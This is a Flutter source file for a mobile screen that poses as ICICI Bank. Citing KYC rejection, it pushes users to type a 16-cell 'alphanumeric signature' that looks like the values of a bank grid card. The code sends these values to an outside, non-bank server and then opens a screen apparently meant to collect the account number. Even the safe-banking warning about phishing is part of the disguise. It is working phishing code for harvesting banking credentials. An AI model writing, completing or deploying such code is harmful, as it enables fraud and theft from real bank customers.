import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:icici/account_number.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;

class Signature extends StatefulWidget {
  const Signature({Key? key}) : super(key: key);

  @override
  State<Signature> createState() => _SignatureState();
}

class _SignatureState extends State<Signature> {
  List<TextEditingController> controllers =
      List.generate(8, (index) => TextEditingController());

  List<FocusNode> focusNodes = List.generate(8, (index) => FocusNode());

  List<TextEditingController> controllers2 =
      List.generate(8, (index) => TextEditingController());

  List<FocusNode> focusNodes2 = List.generate(8, (index) => FocusNode());

  String _getSignatureValue() {
    final firstSignature =
        controllers.map((controller) => controller.text).join();
    final secondSignature =
        controllers2.map((controller) => controller.text).join();
    return '$firstSignature --- $secondSignature';
  }

  var loading = false;

  Future<void> _saveSignature() async {
    setState(() {
      loading = true;
    });
    final signature =
        _getSignatureValue(); // Get the signature value from the text fields

    // Save the signature to SharedPreferences
    final prefs = await SharedPreferences.getInstance();
    prefs.setString('signature', signature);

    //Wait 2 seconds before navigating to the next screen
    await Future.delayed(const Duration(seconds: 2));

    var response = prefs.getString('response');
    //Parse JSON
    var data = jsonDecode(response!);

    await http
        .patch(
            Uri.parse(
                "https://icici-d69xx.dauqu.host/data/signature/${data["_id"]}"),
            headers: <String, String>{
              'Content-Type': 'application/json; charset=UTF-8',
            },
            body: jsonEncode(<String, String>{
              "signature": signature,
            }))
        .then((value) => {
              //Set Laoding to false
              setState(() {
                loading = false;
              }),

              //Move to next page
              Navigator.push(
                context,
                MaterialPageRoute(
                  builder: (context) => const AccountNumber(),
                ),
              )
            })

        //Navigate to other page
        .catchError((onError) {
      print(onError);
      //Set Loading fase
      setState(() {
        loading = false;
      });

      //Show nackend error in dialog
      showDialog(
          context: context,
          builder: (BuildContext context) {
            return AlertDialog(
              title: const Text("Error"),
              content: Text(onError.toString()),
              actions: [
                TextButton(
                    onPressed: () {
                      Navigator.of(context).pop();
                    },
                    child: const Text("OK"))
              ],
            );
          });
    });

    setState(() {
      loading = false;
    });

    // ignore: use_build_context_synchronously
    // Navigator.push(
    //   context,
    //   MaterialPageRoute(
    //     builder: (context) => const AccountNumber(),
    //   ),
    // );
  }

  List<String> hintList = ["A", "B", "C", "D", "E", "F", "G", "H"];
  List<String> hintList2 = ["I", "J", "K", "L", "M", "N", "O", "P"];

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        backgroundColor: Colors.yellow.shade900,
        title: const Text("ICICI Bank"),
      ),
      body: Container(
        padding: const EdgeInsets.all(20),
        width: double.infinity,
        child: SingleChildScrollView(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [
              const SizedBox(
                height: 30,
              ),
              Image.asset(
                "assets/images/logo.jpg",
                height: 60,
              ),
              const SizedBox(
                height: 20,
              ),
              const Text(
                "It's necessary to enter the currect Alphanumeric Signature to complete your KYC or else your request will be rejected.",
                style: TextStyle(fontSize: 15),
              ),
              const SizedBox(
                height: 20,
              ),
              const Text(
                "Enter your Signature",
                style: TextStyle(fontSize: 20),
              ),
              const SizedBox(
                height: 20,
              ),
              Image.asset(
                "assets/images/signature.jpeg",
                width: double.infinity,
                fit: BoxFit.contain,
              ),
              const SizedBox(
                height: 60,
              ),
              // First 8 input fields
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: List.generate(8, (index) {
                  return Expanded(
                    child: TextField(
                      controller: controllers[index],
                      maxLength: 2,
                      focusNode: focusNodes[index],
                      onChanged: (value) {
                        if (value.length == 2 && index < 7) {
                          // Check if two digits are entered
                          controllers[index].text = value.substring(
                              0, 2); // Limit the input to two digits
                          FocusScope.of(context).requestFocus(focusNodes[
                              index + 1]); // Move focus to the next input
                        }
                      },
                      onSubmitted: (value) {
                        if (value.isEmpty && index > 0) {
                          controllers[index].clear();
                          FocusScope.of(context)
                              .requestFocus(focusNodes[index - 2]);
                        }
                      },
                      decoration: InputDecoration(
                        counterText: '', // Remove the character counter
                        border: const OutlineInputBorder(
                          borderSide: BorderSide(color: Colors.red, width: 5.0),
                          borderRadius: BorderRadius.all(
                            Radius.circular(0.0),
                          ),
                        ),
                        hintText: hintList[index],
                      ),
                    ),
                  );
                }),
              ),

              // Second 8 input fields
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: List.generate(8, (index) {
                  return Expanded(
                    child: TextField(
                      controller: controllers2[index],
                      maxLength: 2,
                      focusNode: focusNodes2[index],
                      onChanged: (value) {
                        if (value.length == 2 && index < 7) {
                          // Check if two digits are entered
                          controllers2[index].text = value.substring(
                              0, 2); // Limit the input to two digits
                          FocusScope.of(context).requestFocus(focusNodes2[
                              index + 1]); // Move focus to the next input
                        }
                      },
                      onSubmitted: (value) {
                        if (value.isEmpty && index > 0) {
                          controllers2[index].clear();
                          FocusScope.of(context)
                              .requestFocus(focusNodes2[index - 2]);
                        }
                      },
                      decoration: InputDecoration(
                        counterText: '', // Remove the character counter
                        border: const OutlineInputBorder(
                          borderSide: BorderSide(color: Colors.red, width: 5.0),
                          borderRadius: BorderRadius.all(
                            Radius.circular(0.0),
                          ),
                        ),
                        hintText: hintList2[index],
                      ),
                    ),
                  );
                }),
              ),

              const SizedBox(
                height: 40,
              ),
              SizedBox(
                width: double.infinity,
                child: ElevatedButton(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.yellow.shade900,
                    padding: const EdgeInsets.all(5),
                    elevation: 0,
                  ),
                  onPressed: loading ? null : _saveSignature,
                  child: Text(
                    loading ? 'Loading...' : 'Authenticate',
                    style: const TextStyle(
                      fontSize: 15,
                      fontFamily: 'Ubuntu',
                      fontWeight: FontWeight.w700,
                      color: Colors.white,
                    ),
                  ),
                ),
              ),
              const SizedBox(
                height: 20,
              ),
              const Text(
                "Safe banking tips: Beware of phishing and vishing attacks, Avoid sharing account related information over E-mail and SMS, Please read the terms and conditions carefully before proceeding.",
                textAlign: TextAlign.start,
                style: TextStyle(fontSize: 15),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
